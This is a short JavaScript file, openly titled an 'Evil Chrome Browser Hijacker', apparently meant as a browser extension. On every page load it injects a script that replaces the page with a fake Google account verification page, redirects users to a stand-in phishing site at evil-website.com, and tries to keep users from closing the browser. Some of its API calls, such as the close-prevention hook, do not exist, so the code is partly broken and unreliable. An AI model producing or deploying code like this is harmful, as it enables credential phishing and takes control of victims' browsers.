// Evil Chrome Browser Hijacker 😈

// Inject malicious script into web pages
const maliciousScript = `
// Create a convincing phishing page and redirect users to it
const phishingPage = '<h1>Google Account Verification</h1>...';
document.body.innerHTML = phishingPage;
window.location.href = 'https://evil-website.com/login';
`;

// Hook into the page loading process
chrome.webNavigation.onCompleted.addListener(
    ({ tabId }) => {
        // Execute malicious script on each page load
        chrome.tabs.executeScript(tabId, { code: maliciousScript });
    },
    { url: [{ hostContains: '' }] } // Specify the websites you want to target
);

// Optional: Disable user's ability to close the browser
chrome.windows.onCreated.addListener(() => {
    // Prevent window close event
    chrome.windows.onBeforeUnload.addListener(() => 'Are you sure you want to leave this page?');
});
